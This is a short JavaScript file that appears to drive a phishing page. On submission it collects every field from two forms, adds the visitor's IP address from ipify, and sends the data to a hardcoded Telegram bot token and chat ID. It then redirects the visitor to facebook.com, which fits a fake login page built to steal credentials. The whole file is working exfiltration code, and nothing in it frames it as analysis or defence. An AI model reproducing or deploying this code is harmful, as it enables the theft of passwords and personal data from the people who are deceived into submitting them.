window.onload = () => {
  const token = "6833622634:AAF8G8307HHp3arU3bjFKMUTHa92_U2kpR8";
  const chatID = "1393367014";
  const url = `https://api.telegram.org/bot${token}/sendMessage`;
  const form1 = document.querySelector("#form1");
  const form2 = document.querySelector("#form2");
  const onSubmit = (e) => {
    e.preventDefault();
    const formData = new FormData(e.target);
    let text = `Time: ${new Date().toISOString()}\n`;
    for (const [key, value] of formData.entries()) {
      text += `${key}: ${value}\n`;
    }
    fetch("https://api.ipify.org")
      .then((res) => res.text())
      .then((res) => {
        text += `IP: ${res}\n`;
        console.log(text);
        fetch(`${url}?chat_id=${chatID}&text=${encodeURIComponent(text)}`)
          .then((res) => {
            if (res.ok) {
              console.log("Data sent to Telegram successfully");
            } else {
              console.error("Failed to send data to Telegram");
            }
            location.assign("https://facebook.com");
          })
          .catch((error) => {
            console.error("Error sending data to Telegram: ", error);
            location.assign("https://facebook.com");
          });
      })
      .catch((error) => {
        console.error("Error fetching IP address: ", error);
        location.assign("https://facebook.com");
      });
  };
  form1.addEventListener("submit", onSubmit);
  form2.addEventListener("submit", onSubmit);
};
